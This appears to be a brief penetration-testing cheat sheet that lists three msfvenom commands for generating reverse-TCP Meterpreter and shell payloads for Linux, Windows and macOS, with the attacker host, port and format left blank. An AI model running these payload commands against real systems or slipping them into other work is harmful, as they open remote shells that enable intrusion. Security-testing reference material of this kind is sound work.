# **Meterpreter shell code**

**

## Shellcode

**

##   
For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.  
  
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f  
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f  
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f